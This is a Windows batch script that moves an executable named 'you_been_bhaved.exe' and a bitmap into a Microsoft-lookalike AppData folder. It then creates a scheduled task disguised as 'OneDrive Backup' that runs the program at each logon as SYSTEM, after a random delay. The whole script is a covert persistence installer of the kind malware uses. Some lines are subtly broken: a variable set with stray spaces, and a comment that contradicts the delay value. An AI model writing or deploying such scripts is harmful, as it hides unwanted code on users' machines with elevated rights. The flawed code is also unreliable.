

@echo off
setlocal enabledelayedexpansion

REM Define the name of the files to be moved
set exeName= you_been_bhaved.exe
set bmpName = Bhav.bmp

REM Define the destination path
set exeDestinationPath=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Microsoft\you_been_bhaved.exe
set bmpDestinationPath=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Microsoft\Bhav.bmp
REM Move the file
move "%exeName%" "%exeDestinationPath%"
move "%bmpName%" "%bmpDestinationPath%"


REM Define the name of the task and the path to the program to be run
set taskName=OneDrive Backup
set programPath=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Microsoft\you_been_bhaved.exe

REM Create a random delay in minutes for the scheduled task
REM 180 minutes (3 hours) for example, adjust as needed
set /a "randomDelay = %random% %% 120"  

REM Pad the randomDelay with leading zeros to ensure it is always 4 digits
set "paddedDelay=000%randomDelay%"
set "paddedDelay=!paddedDelay:~-4!"

REM Convert the paddedDelay to the mmmm:ss format
set "formattedDelay=!paddedDelay!:00"

REM Add the task to the Task Scheduler for all users
schtasks /Create /TN "%taskName%" /TR "%programPath%" /SC onlogon /DELAY "%formattedDelay%" /RU "SYSTEM"
